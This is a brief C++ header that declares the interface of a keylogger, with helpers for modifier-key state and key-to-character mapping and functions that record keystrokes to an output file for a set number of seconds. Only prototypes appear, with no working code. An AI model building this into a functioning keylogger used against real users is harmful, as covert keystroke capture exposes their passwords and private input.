#pragma once

bool isShiftPressed();

bool isCapsLockOn();

std::string getCharFromKey(int key);

void start_keylogger(const std::string& outputFilePath, int durationInSeconds);

void run_keylogger_and_save(const std::string& outFile,
                            int durationSeconds = 10);